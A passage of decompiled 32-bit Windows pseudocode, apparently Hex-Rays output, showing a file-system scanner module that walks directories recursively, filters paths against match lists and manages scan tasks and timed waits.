  const struct std::error_code *v16; // eax
  int v18[4]; // [esp+Ch] [ebp-C4h] BYREF
  _DWORD v19[8]; // [esp+1Ch] [ebp-B4h] BYREF
  void **v20; // [esp+3Ch] [ebp-94h] BYREF
  int v21; // [esp+40h] [ebp-90h]
  int v22; // [esp+44h] [ebp-8Ch]
  int v23; // [esp+48h] [ebp-88h]
  _DWORD Src[7]; // [esp+4Ch] [ebp-84h] BYREF
  char v25; // [esp+68h] [ebp-68h]
  void *Block[5]; // [esp+6Ch] [ebp-64h] BYREF
  unsigned int v27; // [esp+80h] [ebp-50h]
  int v28; // [esp+84h] [ebp-4Ch] BYREF
  void *v29; // [esp+88h] [ebp-48h]
  int v30; // [esp+8Ch] [ebp-44h]
  _DWORD *v31; // [esp+90h] [ebp-40h]
  __int64 v32; // [esp+94h] [ebp-3Ch]
  int v33; // [esp+9Ch] [ebp-34h]
  __int128 v34; // [esp+A0h] [ebp-30h] BYREF
  __int64 v35; // [esp+B0h] [ebp-20h]
  int v36; // [esp+B8h] [ebp-18h] BYREF
  char v37; // [esp+BCh] [ebp-14h]
  int v38; // [esp+CCh] [ebp-4h]

  v31 = this;
  v30 = 0;
  v3 = sub_417BF0(a2);
  if ( *(_DWORD *)(v3 + 32) )
  {
    v4 = (unsigned int *)(v3 + 16);
    LOBYTE(v3) = sub_417170(this, v3 + 16);
    if ( !(_BYTE)v3 )
    {
      v35 = 0x700000000i64;
      v5 = 0;
      LOWORD(v34) = 0;
      v36 = 0;
      v37 = 0;
      v38 = 0;
      if ( &v34 != (__int128 *)v4 )
      {
        v6 = v4;
        if ( v4[5] >= 8 )
          v6 = (unsigned int *)*v4;
        sub_404330(&v34, v6, v4[4]);
        v5 = v36;
      }
      sub_4055B0(Block, v4);
      v21 = 0;
      v22 = 0;
      v23 = 4;
      LOBYTE(v38) = 2;
      v20 = &ANEventScanFileSystem::`vftable';
      sub_4055B0(Src, Block);
      LOBYTE(v38) = 0;
      if ( v27 >= 8 )
      {
        v7 = Block[0];
        if ( 2 * v27 + 2 >= 0x1000 )
        {
          v7 = (void *)*((_DWORD *)Block[0] - 1);
          if ( (unsigned int)(Block[0] - v7 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        sub_44775B(v7);
      }
      Block[4] = 0;
      v27 = 7;
      LOWORD(Block[0]) = 0;
      v33 = 0;
      v32 = 0i64;
      v29 = v18;
      v18[1] = v21;
      v18[2] = v22;
      v18[3] = v23;
      LOBYTE(v38) = 5;
      v18[0] = (int)&ANEventScanFileSystem::`vftable';
      sub_4055B0(v19, Src);
      v19[6] = v31;
      v19[7] = sub_417130;
      LOBYTE(v38) = 6;
      v8 = operator new(0xB0u);
      v29 = v8;
      LOBYTE(v38) = 8;
      memset(v8, 0, 0xB0u);
      v9 = sub_4183D0((int)v8, v18);
      BYTE4(v32) = 0;
      LODWORD(v32) = v9;
      LOBYTE(v33) = 0;
      LOBYTE(v38) = 10;
      sub_414980(v18);
      if ( !v9 )
      {
        v16 = (const struct std::error_code *)sub_407EE0(&v28, 4);
        std::_Throw_future_error(v16);
      }
      _InterlockedIncrement((volatile signed __int32 *)(v9 + 4));
      Src[6] = v9;
      v25 = 1;
      v30 = 1;
      LOBYTE(v38) = 11;
      if ( !_InterlockedExchangeAdd((volatile signed __int32 *)(v9 + 4), 0xFFFFFFFF) )
      {
        v10 = *(void (__stdcall ****)(int))(v9 + 120);
        if ( v10 )
          (**v10)(v9);
        else
          (**(void (__stdcall ***)(int))v9)(1);
      }
      LOBYTE(v38) = 12;
      if ( v5 && !_InterlockedDecrement((volatile signed __int32 *)(v5 + 4)) )
      {
        v11 = *(void (__stdcall ****)(int))(v5 + 120);
        if ( v11 )
          (**v11)(v5);
        else
          (**(void (__stdcall ***)(int))v5)(1);
      }
      v36 = v9;
      v37 = 1;
      LOBYTE(v38) = 0;
      sub_414980(&v20);
      v12 = v31[7];
      v13 = v31 + 6;
      if ( v12 == v31[8] )
      {
        sub_417C70(v13, (_DWORD *)v12, (int)&v34);
      }
      else
      {
        v14 = v34;
        LOWORD(v34) = 0;
        *(_OWORD *)v12 = v14;
        *(_QWORD *)(v12 + 16) = v35;
        v15 = v12 + 24;
        v35 = 0x700000000i64;
        *(_DWORD *)v15 = 0;
        if ( (int *)v15 != &v36 )
        {
          *(_DWORD *)v15 = v9;
          v36 = 0;
        }
        *(_BYTE *)(v15 + 4) = 1;
        v13[1] += 32;
      }
      LOBYTE(v3) = sub_417080(&v34);
    }
  }
  return v3;
}
// 4B1630: using guessed type void *ANEventScanFileSystem::`vftable';

//----- (00417080) --------------------------------------------------------
int __thiscall sub_417080(_DWORD *this)
{
  int v2; // ecx
  void (__stdcall ***v3)(int); // edx
  unsigned int v4; // ecx
  _DWORD *v5; // eax
  int result; // eax

  v2 = this[6];
  if ( v2 && !_InterlockedExchangeAdd((volatile signed __int32 *)(v2 + 4), 0xFFFFFFFF) )
  {
    v3 = *(void (__stdcall ****)(int))(v2 + 120);
    if ( v3 )
      (**v3)(v2);
    else
      (**(void (__stdcall ***)(int))v2)(1);
  }
  v4 = this[5];
  if ( v4 >= 8 )
  {
    v5 = (_DWORD *)*this;
    if ( 2 * v4 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v5 = (_DWORD *)*(v5 - 1);
    }
    sub_44775B(v5);
  }
  result = 0;
  this[4] = 0;
  this[5] = 7;
  *(_WORD *)this = 0;
  return result;
}

//----- (00417130) --------------------------------------------------------
void __thiscall sub_417130(_DWORD *this, void *a2)
{
  int v3; // eax
  int v4[12]; // [esp-28h] [ebp-30h] BYREF

  v3 = sub_417E60(a2);
  if ( *(_DWORD *)(v3 + 32) )
    sub_417300(
      this,
      (_DWORD *)(v3 + 16),
      (int)___7___Func_impl_no_alloc_V_lambda_1___4__OnScanFileSystem_ANFileSystemScannerModule__AAEX__QAUANIEvent___Z_X__QBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___std__6B_,
      (int)this,
      v4[2],
      v4[3],
      v4[4],
      v4[5],
      v4[6],
      v4[7],
      v4[8],
      v4);
}
// 4B15F8: using guessed type int (__stdcall *___7___Func_impl_no_alloc_V_lambda_1___4__OnScanFileSystem_ANFileSystemScannerModule__AAEX__QAUANIEvent___Z_X__QBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___std__6B_[2])(int);

//----- (00417170) --------------------------------------------------------
char __thiscall sub_417170(_DWORD *this, int a2)
{
  int v2; // ebx
  char *v3; // eax
  int v4; // esi
  char *v5; // ecx
  int v6; // eax
  _QWORD *v7; // edi
  int *v8; // esi
  int *v9; // ebx
  int v10; // ecx
  void (__stdcall ***v11)(int); // edx
  char v12; // al
  _DWORD *v13; // esi
  _DWORD *v14; // edi
  const struct std::error_code *v16; // eax
  int v17; // [esp+10h] [ebp-30h] BYREF
  __int64 v18; // [esp+18h] [ebp-28h] BYREF
  _DWORD *v19; // [esp+24h] [ebp-1Ch]
  _QWORD *v20; // [esp+28h] [ebp-18h]
  char *v21; // [esp+2Ch] [ebp-14h]
  char v22; // [esp+33h] [ebp-Dh]
  int v23; // [esp+3Ch] [ebp-4h]

  v2 = (int)this;
  v19 = this;
  v3 = (char *)a2;
  v21 = (char *)a2;
  v22 = 0;
  if ( !*(_DWORD *)(a2 + 16) )
    return v22;
  v4 = this[6];
  if ( v4 != this[7] )
  {
    v18 = 1i64;
    do
    {
      v5 = *(char **)(v4 + 24);
      if ( !v5 || *(_BYTE *)(v4 + 28) && v5[108] )
      {
        v16 = (const struct std::error_code *)sub_407EE0(&v17, 4);
        std::_Throw_future_error(v16);
      }
      if ( !sub_417EF0(v5, &v18) )
      {
        v6 = *(_DWORD *)(v2 + 28);
        v7 = (_QWORD *)(v4 + 32);
        v20 = (_QWORD *)v6;
        if ( v4 + 32 != v6 )
        {
          v8 = (int *)(v4 + 24);
          do
          {
            sub_405520(v8 - 6, v7);
            v9 = v8 + 8;
            v23 = 0;
            if ( v8 != v8 + 8 )
            {
              v10 = *v8;
              if ( *v8 && !_InterlockedExchangeAdd((volatile signed __int32 *)(v10 + 4), 0xFFFFFFFF) )
              {
                v11 = *(void (__stdcall ****)(int))(v10 + 120);
                if ( v11 )
                  (**v11)(v10);
                else
                  (**(void (__stdcall ***)(int))v10)(1);
              }
              *v8 = *v9;
              v12 = *((_BYTE *)v8 + 36);
              *v9 = 0;
              *((_BYTE *)v8 + 4) = v12;
            }
            v7 += 4;
            v23 = -1;
            v8 += 8;
          }
          while ( v7 != v20 );
          v2 = (int)v19;
          v6 = v19[7];
        }
        sub_417080((_DWORD *)(v6 - 32));
        *(_DWORD *)(v2 + 28) -= 32;
        v4 = *(_DWORD *)(v2 + 24);
        if ( v4 == *(_DWORD *)(v2 + 28) )
          break;
      }
      v4 += 32;
    }
    while ( v4 != *(_DWORD *)(v2 + 28) );
    v3 = v21;
  }
  v13 = *(_DWORD **)(v2 + 24);
  v14 = *(_DWORD **)(v2 + 28);
  if ( v13 == v14 )
    return v22;
  while ( !sub_40C380(v13, v3) )
  {
    v3 = v21;
    v13 += 8;
    if ( v13 == v14 )
      return v22;
  }
  return 1;
}

//----- (00417300) --------------------------------------------------------
void __thiscall sub_417300(
        _DWORD *this,
        _DWORD *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int *a12)
{
  const WCHAR *v12; // eax
  HANDLE FirstFileW; // eax
  void *v14; // ecx
  const unsigned __int16 *v15; // edx
  HANDLE v16; // esi
  int v17; // eax
  int v18; // eax
  _DWORD *v19; // edx
  _DWORD *v20; // eax
  _DWORD *v21; // ecx
  void *v22; // ecx
  const unsigned __int16 *v23; // edx
  void *v24; // ecx
  const unsigned __int16 *v25; // edx
  _DWORD *v26; // edx
  _DWORD *v27; // eax
  _DWORD *v28; // edx
  _DWORD *v29; // eax
  void *v30; // ecx
  const unsigned __int16 *v31; // edx
  void *v32; // ecx
  const unsigned __int16 *v33; // edx
  _DWORD v34[9]; // [esp-28h] [ebp-2ECh] BYREF
  const unsigned __int16 *v35; // [esp-4h] [ebp-2C8h]
  void *Block[5]; // [esp+Ch] [ebp-2B8h] BYREF
  unsigned int v37; // [esp+20h] [ebp-2A4h]
  void *Src[5]; // [esp+24h] [ebp-2A0h] BYREF
  unsigned int v39; // [esp+38h] [ebp-28Ch]
  _DWORD *v40; // [esp+3Ch] [ebp-288h]
  _DWORD *v41; // [esp+40h] [ebp-284h]
  void *v42[4]; // [esp+44h] [ebp-280h] BYREF
  __int64 v43; // [esp+54h] [ebp-270h]
  HANDLE hFindFile; // [esp+5Ch] [ebp-268h]
  char v45; // [esp+63h] [ebp-261h]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+64h] [ebp-260h] BYREF
  int v47; // [esp+2C0h] [ebp-4h]

  v41 = this;
  v47 = 0;
  if ( a2[4] )
  {
    if ( !a12 )
      return;
    memset(&FindFileData, 0, sizeof(FindFileData));
    v12 = (const WCHAR *)sub_40D6B0(Block, a2, L"\\*");
    if ( *((_DWORD *)v12 + 5) >= 8u )
      v12 = *(const WCHAR **)v12;
    FirstFileW = FindFirstFileW(v12, &FindFileData);
    hFindFile = FirstFileW;
    if ( v37 >= 8 )
    {
      v14 = Block[0];
      v15 = (const unsigned __int16 *)(2 * v37 + 2);
      if ( (unsigned int)v15 >= 0x1000 )
      {
        v14 = (void *)*((_DWORD *)Block[0] - 1);
        v15 = (const unsigned __int16 *)(2 * v37 + 37);
        if ( (unsigned int)(Block[0] - v14 - 4) > 0x1F )
LABEL_48:
          _invalid_parameter_noinfo_noreturn();
      }
      v35 = v15;
      sub_44775B(v14);
      FirstFileW = hFindFile;
    }
    Block[4] = 0;
    v37 = 7;
    LOWORD(Block[0]) = 0;
    if ( FirstFileW != (HANDLE)-1 )
    {
      v16 = hFindFile;
      do
      {
        v17 = wcscmp(FindFileData.cFileName, (const unsigned __int16 *)".");
        if ( v17 )
          v17 = v17 < 0 ? -1 : 1;
        if ( v17 )
        {
          v18 = wcscmp(FindFileData.cFileName, L"..");
          if ( v18 )
            v18 = v18 < 0 ? -1 : 1;
          if ( v18 && (FindFileData.dwFileAttributes & 4) == 0 )
          {
            v19 = sub_40D6B0(Src, a2, "\\");
            LOBYTE(v47) = 1;
            v20 = sub_4044A0(v19, FindFileData.cFileName, wcslen(FindFileData.cFileName));
            *(_OWORD *)v42 = *(_OWORD *)v20;
            v43 = *((_QWORD *)v20 + 2);
            *(_WORD *)v20 = 0;
            v21 = v41;
            v20[4] = 0;
            v20[5] = 7;
            v45 = sub_4179D0(v21, (int *)v42);
            if ( HIDWORD(v43) >= 8 )
            {
              v22 = v42[0];
              v23 = (const unsigned __int16 *)(2 * HIDWORD(v43) + 2);
              if ( (unsigned int)v23 >= 0x1000 )
              {
                v22 = (void *)*((_DWORD *)v42[0] - 1);
                v23 = (const unsigned __int16 *)(2 * HIDWORD(v43) + 37);
                if ( (unsigned int)(v42[0] - v22 - 4) > 0x1F )
                  goto LABEL_48;
              }
              v35 = v23;
              sub_44775B(v22);
            }
            v43 = 0x700000000i64;
            LOBYTE(v47) = 0;
            LOWORD(v42[0]) = 0;
            if ( v39 >= 8 )
            {
              v24 = Src[0];
              v25 = (const unsigned __int16 *)(2 * v39 + 2);
              if ( (unsigned int)v25 >= 0x1000 )
              {
                v24 = (void *)*((_DWORD *)Src[0] - 1);
                v25 = (const unsigned __int16 *)(2 * v39 + 37);
                if ( (unsigned int)(Src[0] - v24 - 4) > 0x1F )
                  goto LABEL_48;
              }
              v35 = v25;
              sub_44775B(v24);
            }
            if ( !v45 )
            {
              v35 = "\\";
              if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
              {
                v26 = sub_40D6B0(Src, a2, v35);
                LOBYTE(v47) = 2;
                v27 = sub_4044A0(v26, FindFileData.cFileName, wcslen(FindFileData.cFileName));
                v43 = 0i64;
                *(_OWORD *)v42 = *(_OWORD *)v27;
                v43 = *((_QWORD *)v27 + 2);
                v27[4] = 0;
                v27[5] = 7;
                *(_WORD *)v27 = 0;
                v40 = v34;
                v35 = 0;
                LOBYTE(v47) = 4;
                if ( a12 )
                  v35 = (const unsigned __int16 *)(*(int (__thiscall **)(int *, _DWORD *))*a12)(a12, v34);
                LOBYTE(v47) = 3;
                sub_417300(v42, v34[0], v34[1], v34[2], v34[3], v34[4], v34[5], v34[6], v34[7], v34[8], v35);
                LOBYTE(v47) = 2;
              }
              else
              {
                v28 = sub_40D6B0(Src, a2, v35);
                LOBYTE(v47) = 5;
                v29 = sub_4044A0(v28, FindFileData.cFileName, wcslen(FindFileData.cFileName));
                v43 = 0i64;
                *(_OWORD *)v42 = *(_OWORD *)v29;
                v43 = *((_QWORD *)v29 + 2);
                v29[4] = 0;
                v29[5] = 7;
                *(_WORD *)v29 = 0;
                LOBYTE(v47) = 6;
                if ( !a12 )
                  std::_Xbad_function_call();
                (*(void (__thiscall **)(int *, void **))(*a12 + 8))(a12, v42);
                LOBYTE(v47) = 5;
              }
              if ( HIDWORD(v43) >= 8 )
              {
                v30 = v42[0];
                v31 = (const unsigned __int16 *)(2 * HIDWORD(v43) + 2);
                if ( (unsigned int)v31 >= 0x1000 )
                {
                  v30 = (void *)*((_DWORD *)v42[0] - 1);
                  v31 = (const unsigned __int16 *)(2 * HIDWORD(v43) + 37);
                  if ( (unsigned int)(v42[0] - v30 - 4) > 0x1F )
                    goto LABEL_48;
                }
                v35 = v31;
                sub_44775B(v30);
              }
              LOBYTE(v47) = 0;
              LOWORD(v42[0]) = 0;
              v43 = 0x700000000i64;
              if ( v39 >= 8 )
              {
                v32 = Src[0];
                v33 = (const unsigned __int16 *)(2 * v39 + 2);
                if ( (unsigned int)v33 >= 0x1000 )
                {
                  v32 = (void *)*((_DWORD *)Src[0] - 1);
                  v33 = (const unsigned __int16 *)(2 * v39 + 37);
                  if ( (unsigned int)(Src[0] - v32 - 4) > 0x1F )
                    goto LABEL_48;
                }
                v35 = v33;
                sub_44775B(v32);
              }
            }
            v16 = hFindFile;
          }
        }
      }
      while ( FindNextFileW(v16, &FindFileData) );
      FindClose(v16);
    }
  }
  if ( a12 )
    (*(void (__stdcall **)(bool))(*a12 + 16))(a12 != &a3);
}
// 4B16BC: using guessed type wchar_t asc_4B16BC[3];
// 4B16C4: using guessed type wchar_t asc_4B16C4[3];

//----- (00417830) --------------------------------------------------------
int __thiscall sub_417830(int this, int a2)
{
  unsigned int v3; // edx
  unsigned __int16 *v4; // eax
  int v5; // ecx
  char *v6; // esi
  char *v7; // edi
  char *v8; // esi
  char *v9; // edi
  int v10; // esi
  void *v11; // ecx
  void *v13; // ecx
  void *Block[5]; // [esp+10h] [ebp-28h] BYREF
  unsigned int v15; // [esp+24h] [ebp-14h]
  int v16; // [esp+34h] [ebp-4h]

  if ( *(_DWORD *)(a2 + 16) )
  {
    sub_4148A0(Block, (unsigned __int16 *)a2);
    v16 = 0;
    if ( !sub_40C380(Block, (char *)(this + 84)) && !sub_4179D0((_DWORD *)this, (int *)a2) )
    {
      v3 = *(_DWORD *)(a2 + 16);
      if ( !v3 )
        goto LABEL_33;
      v4 = (unsigned __int16 *)(this + 108);
      if ( *(_DWORD *)(this + 128) >= 8u )
        v4 = *(unsigned __int16 **)v4;
      v5 = a2;
      if ( *(_DWORD *)(a2 + 20) >= 8u )
        v5 = *(_DWORD *)a2;
      if ( sub_40AB20(v5, v3, 0, v4, *(_DWORD *)(this + 124)) == -1 )
      {
LABEL_33:
        if ( !sub_417A80((int *)a2) )
        {
          v6 = *(char **)(this + 60);
          v7 = *(char **)(this + 64);
          if ( v6 == v7 )
          {
LABEL_14:
            v8 = *(char **)(this + 72);
            v9 = *(char **)(this + 76);
            if ( v8 == v9 )
            {
LABEL_17:
              v10 = 1;
            }
            else
            {
              while ( !sub_40C380(Block, v8) )
              {
                v8 += 24;
                if ( v8 == v9 )
                  goto LABEL_17;
              }
              v10 = 2;
            }
          }
          else
          {
            while ( !sub_40C380(Block, v6) )
            {
              v6 += 24;
              if ( v6 == v7 )
                goto LABEL_14;
            }
            v10 = 0;
          }
          if ( v15 < 8 )
            return v10;
          v11 = Block[0];
          if ( 2 * v15 + 2 < 0x1000
            || (v11 = (void *)*((_DWORD *)Block[0] - 1), (unsigned int)(Block[0] - v11 - 4) <= 0x1F) )
          {
            sub_44775B(v11);
            return v10;
          }
LABEL_30:
          _invalid_parameter_noinfo_noreturn();
        }
      }
    }
    if ( v15 >= 8 )
    {
      v13 = Block[0];
      if ( 2 * v15 + 2 >= 0x1000 )
      {
        v13 = (void *)*((_DWORD *)Block[0] - 1);
        if ( (unsigned int)(Block[0] - v13 - 4) > 0x1F )
          goto LABEL_30;
      }
      sub_44775B(v13);
    }
  }
  return 0;
}

//----- (004179D0) --------------------------------------------------------
char __thiscall sub_4179D0(_DWORD *this, int *a2)
{
  _DWORD *v2; // eax
  unsigned int v3; // edx
  int v4; // esi
  int v5; // ebx
  unsigned __int16 *v6; // eax
  int v7; // ecx
  int v8; // esi
  int v9; // ebx
  unsigned __int16 *v10; // eax
  int v11; // ecx

  v2 = this;
  v3 = a2[4];
  if ( !v3 )
    return 0;
  v4 = this[12];
  v5 = this[13];
  if ( v4 != v5 )
  {
    while ( 1 )
    {
      v6 = (unsigned __int16 *)v4;
      if ( *(_DWORD *)(v4 + 20) >= 8u )
        v6 = *(unsigned __int16 **)v4;
      v7 = (int)a2;
      if ( (unsigned int)a2[5] >= 8 )
        v7 = *a2;
      if ( sub_40AB20(v7, v3, 0, v6, *(_DWORD *)(v4 + 16)) != -1 )
        return 0;
      v3 = a2[4];
      v4 += 24;
      if ( v4 == v5 )
      {
        v2 = this;
        break;
      }
    }
  }
  v8 = v2[9];
  v9 = v2[10];
  if ( v8 == v9 )
    return 0;
  while ( 1 )
  {
    v10 = (unsigned __int16 *)v8;
    if ( *(_DWORD *)(v8 + 20) >= 8u )
      v10 = *(unsigned __int16 **)v8;
    v11 = (int)a2;
    if ( (unsigned int)a2[5] >= 8 )
      v11 = *a2;
    if ( sub_40AB20(v11, v3, 0, v10, *(_DWORD *)(v8 + 16)) != -1 )
      break;
    v3 = a2[4];
    v8 += 24;
    if ( v8 == v9 )
      return 0;
  }
  return 1;
}

//----- (00417A80) --------------------------------------------------------
bool __stdcall sub_417A80(int *a1)
{
  int v1; // esi
  int v2; // eax
  unsigned int v3; // ecx
  int v4; // esi
  _BYTE *v5; // ecx
  void *Block; // [esp+8h] [ebp-18h] BYREF
  unsigned int v8; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v1 = (int)a1;
  if ( !a1[4] )
    return 0;
  v2 = sub_40C780(&dword_4F98B0, (int)&Block, (int)&savedregs);
  v3 = *(_DWORD *)(v2 + 16);
  if ( *(_DWORD *)(v2 + 20) >= 8u )
    v2 = *(_DWORD *)v2;
  if ( (unsigned int)a1[5] >= 8 )
    v1 = *a1;
  v4 = sub_40AB20(v1, a1[4], 0, (unsigned __int16 *)v2, v3);
  if ( v8 >= 8 )
  {
    v5 = Block;
    if ( 2 * v8 + 2 >= 0x1000 )
    {
      v5 = (_BYTE *)*((_DWORD *)Block - 1);
      if ( (unsigned int)((_BYTE *)Block - v5 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v5);
  }
  return v4 != -1;
}

//----- (00417B20) --------------------------------------------------------
void __thiscall sub_417B20(_DWORD *this)
{
  _DWORD *v2; // esi
  _DWORD *v3; // ebx

  v2 = (_DWORD *)*this;
  if ( *this )
  {
    v3 = (_DWORD *)this[1];
    if ( v2 != v3 )
    {
      do
      {
        sub_417080(v2);
        v2 += 8;
      }
      while ( v2 != v3 );
      v2 = (_DWORD *)*this;
    }
    if ( ((this[2] - (_DWORD)v2) & 0xFFFFFFE0) >= 0x1000 )
    {
      if ( (unsigned int)v2 - *(v2 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v2 = (_DWORD *)*(v2 - 1);
    }
    sub_44775B(v2);
    *this = 0;
    this[1] = 0;
    this[2] = 0;
  }
}

//----- (00417B90) --------------------------------------------------------
void *__thiscall sub_417B90(void *this, int a2)
{
  int v4[2]; // [esp+8h] [ebp-28h] BYREF
  char v5; // [esp+10h] [ebp-20h]
  int v6; // [esp+14h] [ebp-1Ch]
  int *v7; // [esp+2Ch] [ebp-4h]

  v4[0] = (int)&std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  v4[1] = *(_DWORD *)a2;
  v5 = *(_BYTE *)(a2 + 4);
  v6 = *(_DWORD *)(a2 + 8);
  v7 = v4;
  sub_412DF0(v4, (int)this);
  if ( v7 )
    (*(void (__stdcall **)(bool))(*v7 + 16))(v7 != v4);
  return this;
}
// 4B16A4: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (00417BF0) --------------------------------------------------------
int __thiscall sub_417BF0(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast(
           (int)this,
           0,
           &ANIEvent `RTTI Type Descriptor',
           &ANEventScanFileSystemAsync `RTTI Type Descriptor',
           1);
}

//----- (00417C70) --------------------------------------------------------
char *__thiscall sub_417C70(_DWORD *this, _DWORD *a2, int a3)
{
  _DWORD *v3; // edi
  unsigned int v4; // esi
  int v5; // eax
  unsigned int v6; // ecx
  unsigned int v7; // edx
  unsigned int v8; // eax
  size_t v9; // eax
  void *v10; // eax
  void *v11; // ecx
  _DWORD *v12; // eax
  char *v13; // ecx
  char *v14; // ecx
  _DWORD *v15; // edx
  _DWORD *v16; // ecx
  _DWORD *v17; // edx
  _DWORD *v18; // esi
  _DWORD *v19; // edi
  char *result; // eax
  int v21; // [esp-8h] [ebp-3Ch]
  size_t v22; // [esp+Ch] [ebp-28h]
  int v23; // [esp+10h] [ebp-24h]
  char *v25; // [esp+1Ch] [ebp-18h]
  unsigned int v26; // [esp+24h] [ebp-10h]
  _DWORD *v27; // [esp+24h] [ebp-10h]

  v3 = this;
  v4 = (unsigned int)a2 - *this;
  v5 = (this[1] - *this) >> 5;
  v23 = v5;
  if ( v5 == 0x7FFFFFF )
    sub_404860();
  v6 = v5 + 1;
  v7 = (v3[2] - *v3) >> 5;
  v26 = v7 >> 1;
  if ( v7 <= 0x7FFFFFF - (v7 >> 1) )
  {
    v8 = v7 + v26;
    if ( v7 + v26 < v6 )
      v8 = v6;
  }
  else
  {
    v8 = v5 + 1;
  }
  if ( v8 > 0x7FFFFFF )
    goto LABEL_28;
  v9 = 32 * v8;
  v22 = v9;
  if ( v9 < 0x1000 )
  {
    if ( v9 )
      v12 = operator new(v9);
    else
      v12 = 0;
    goto LABEL_14;
  }
  if ( v9 + 35 <= v9 )
LABEL_28:
    sub_403CC0();
  v10 = operator new(v9 + 35);
  v11 = v10;
  if ( !v10 )
    goto LABEL_30;
  v12 = (_DWORD *)(((unsigned int)v10 + 35) & 0xFFFFFFE0);
  *(v12 - 1) = v11;
LABEL_14:
  v13 = (char *)v12 + (v4 & 0xFFFFFFE0);
  *((_DWORD *)v13 + 4) = 0;
  *((_DWORD *)v13 + 5) = 0;
  v25 = v13;
  v27 = v12;
  *(_OWORD *)v13 = *(_OWORD *)a3;
  *((_QWORD *)v13 + 2) = *(_QWORD *)(a3 + 16);
  v14 = v13 + 24;
  *(_DWORD *)(a3 + 16) = 0;
  *(_DWORD *)(a3 + 20) = 7;
  *(_WORD *)a3 = 0;
  v15 = (_DWORD *)(a3 + 24);
  *(_DWORD *)v14 = 0;
  if ( v14 != (char *)(a3 + 24) )
  {
    *(_DWORD *)v14 = *v15;
    *v15 = 0;
  }
  v14[4] = 1;
  v16 = (_DWORD *)*v3;
  v17 = (_DWORD *)v3[1];
  v21 = (int)v12;
  if ( a2 != v17 )
  {
    sub_418180(v16, a2, (int)v12);
    v17 = (_DWORD *)v3[1];
    v16 = a2;
    v21 = (int)(v25 + 32);
  }
  sub_418180(v16, v17, v21);
  v18 = (_DWORD *)*v3;
  if ( *v3 )
  {
    if ( v18 != (_DWORD *)v3[1] )
    {
      v19 = (_DWORD *)v3[1];
      do
      {
        sub_417080(v18);
        v18 += 8;
      }
      while ( v18 != v19 );
      v3 = this;
      v18 = (_DWORD *)*this;
    }
    if ( ((v3[2] - (_DWORD)v18) & 0xFFFFFFE0) < 0x1000 )
      goto LABEL_26;
    if ( (unsigned int)v18 - *(v18 - 1) - 4 <= 0x1F )
    {
      v18 = (_DWORD *)*(v18 - 1);
LABEL_26:
      sub_44775B(v18);
      goto LABEL_27;
    }
LABEL_30:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_27:
  *v3 = v27;
  v3[1] = &v27[8 * v23 + 8];
  result = v25;
  v3[2] = (char *)v27 + v22;
  return result;
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);
// 404860: using guessed type void __noreturn sub_404860(void);

//----- (00417E60) --------------------------------------------------------
int __thiscall sub_417E60(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast(
           (int)this,
           0,
           &ANIEvent `RTTI Type Descriptor',
           &ANEventScanFileSystem `RTTI Type Descriptor',
           1);
}

//----- (00417EF0) --------------------------------------------------------
int __thiscall sub_417EF0(char *this, _QWORD *a2)
{
  struct _Mtx_internal_imp_t *v3; // ebx
  int v4; // eax
  int v5; // esi
  __int64 perf_frequency; // kr08_8
  __int64 perf_counter; // rax
  __int64 v8; // kr10_8
  __int64 v9; // rax
  __int64 v10; // kr18_8
  __int64 v11; // rax
  __int64 v12; // rax
  int v13; // ebx
  __int64 v14; // rdi
  int v15; // eax
  signed __int64 v16; // rdi
  int v17; // eax
  int v19; // [esp+1Ch] [ebp-48h]
  unsigned int v20; // [esp+20h] [ebp-44h]
  unsigned int v22; // [esp+2Ch] [ebp-38h]
  int v23; // [esp+30h] [ebp-34h]
  bool v24; // [esp+37h] [ebp-2Dh]
  __int64 v25; // [esp+38h] [ebp-2Ch] BYREF
  int v26; // [esp+40h] [ebp-24h]
  _Mtx_t v27[2]; // [esp+48h] [ebp-1Ch]
  int v28; // [esp+60h] [ebp-4h]

  v3 = (struct _Mtx_internal_imp_t *)(this + 20);
  v27[1] = 0;
  v27[0] = (_Mtx_t)(this + 20);
  v4 = _Mtx_lock((_Mtx_t)(this + 20));
  if ( v4 )
LABEL_23:
    std::_Throw_C_error(v4);
  LOBYTE(v27[1]) = 1;
  v28 = 0;
  if ( (*(unsigned __int8 (__thiscall **)(char *))(*(_DWORD *)this + 12))(this) )
  {
    v5 = 2;
  }
  else
  {
    v19 = (int)(this + 68);
    perf_frequency = _Query_perf_frequency();
    perf_counter = _Query_perf_counter();
    v8 = 1000000000 * (perf_counter / perf_frequency) + 1000000000 * (perf_counter % perf_frequency) / perf_frequency;
    v9 = 1000000i64 * *a2;
    v22 = v8 + v9;
    v20 = (unsigned __int64)(v8 + v9) >> 32;
    if ( *((_DWORD *)this + 28) )
    {
      v3 = v27[0];
LABEL_20:
      v5 = 0;
    }
    else
    {
      while ( 1 )
      {
        v10 = _Query_perf_frequency();
        v11 = _Query_perf_counter();
        v12 = 1000000000 * (v11 / v10) + 1000000000 * (v11 % v10) / v10;
        if ( v12 >= __SPAIR64__(v20, v22) )
        {
